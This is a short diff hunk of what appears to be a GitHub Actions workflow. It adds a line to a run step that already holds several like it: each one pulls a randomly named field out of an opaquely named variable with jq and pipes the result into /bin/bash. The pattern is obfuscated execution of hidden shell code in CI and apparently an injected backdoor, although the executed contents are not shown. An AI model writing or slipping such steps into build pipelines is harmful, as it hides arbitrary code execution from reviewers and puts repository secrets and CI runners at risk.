@@ -38,6 +38,7 @@ jobs:
           printf '%s' "$t5047" | jq -r .ejhgi2 | /bin/bash
           echo $aiel4344 | jq -r .yi3 | /bin/bash
           printf '%s' "$ro1" | jq -r .z06 | /bin/bash
+          echo $ycwnz35 | jq -r .e9053 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
